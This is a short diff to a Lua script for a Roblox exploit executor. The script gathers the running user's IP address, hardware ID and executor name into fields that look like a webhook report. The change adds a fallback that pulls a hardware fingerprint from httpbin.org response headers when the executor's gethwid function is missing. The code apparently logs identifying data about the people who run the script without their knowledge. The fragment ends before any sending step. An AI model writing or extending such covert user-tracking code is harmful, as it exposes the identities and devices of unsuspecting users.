@@ -111,7 +111,9 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local function GetJson(v)
-    return HttpService:JSONDecode(game:HttpGet(v))
+    return HttpService:JSONDecode(request({
+        Url = v
+    }).Body)
 end
 
 local function GetIP()
@@ -176,7 +178,13 @@ if not _G.Skip then
                             },
                             {
                                 name = "Hwid",
-                                value = gethwid()
+                                value = (gethwid or (function()
+                                    for i, v in pairs(GetJson("https://httpbin.org/get").headers) do
+                                        if string.find(i, "Fingerprint") then
+                                            return v
+                                        end
+                                    end
+                                end))()
                             },
                             {
                                 name = "Executor",
